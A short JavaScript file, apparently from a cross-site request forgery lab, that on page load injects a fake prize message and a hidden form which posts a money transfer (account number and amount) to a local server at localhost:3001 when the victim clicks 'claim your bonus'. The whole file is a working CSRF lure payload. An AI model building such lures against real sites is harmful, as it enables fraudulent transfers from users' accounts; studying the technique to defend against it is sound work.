document.addEventListener('DOMContentLoaded', () => {

    const html = "<h1>Congratulations. You just won a bonus of 1 million dollars!!!</h1>" + 
    "<form action=\"http://localhost:3001/prize\" method=\"post\">" + 
    "<input type=\"hidden\" name=\"TransferAccount\" value=\"9876865434\" />" +
    "<input type=\"hidden\" name=\"Amount\" value=\"1000\" />" +
    "<input type=\"submit\" value=\"Click here to claim your bonus\"/>" +
    "</form>";

    const childs = new DOMParser().parseFromString(html, 'text/html').body.children;
    
    console.log(childs)

    for (const child of [...childs]) {
        document.body.appendChild(child);
    }
})